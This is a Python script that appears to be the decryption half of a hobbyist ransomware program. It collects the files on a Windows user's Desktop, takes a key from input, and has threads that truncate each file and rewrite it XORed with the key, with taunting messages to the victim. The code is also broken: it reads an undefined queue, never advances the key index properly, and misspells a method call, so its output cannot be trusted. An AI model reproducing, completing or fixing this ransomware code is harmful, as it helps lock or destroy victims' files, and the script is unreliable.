from operator import xor
import os
import threading
import queue

def decrypt(key):
    while True:
        file = g.get()
        print(f'Decrypt {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                ## INCREMENT THE KEY INDEX
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index = 1
            print(f'{file} is now decrypted')
        except:
            print('You could not decrypt the files I migth have won please restore youre computer')
        q.tas_done()

##encryption info
ENCRYPTION_LEVEL = 512 // 8  ## gives 512 bit encryption
key_char_pool = 'qwertyuiopasdfghjklzxcvbnm,.|;:!![]{}'
key_char_pool_len = len(key_char_pool)

#grab files to decrypt
print("fixing your files so I can encrypt them")
desktop_path = os.environ['USERPROFILE']+'\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2]+'exe':
       abs_files.append(f'{desktop_path}\\{f}') 
print("found all the files")

key = input("Ented the encryption key if you find it")


q = queue.Queue()
for f in abs_files:
    q.put(f)

for i in range(10):
    t = threading.Thread(target=decrypt, args=(key,), daemon=True)
    t.start()

q.join()
print("Decryption is completed I am done now bye bye!")


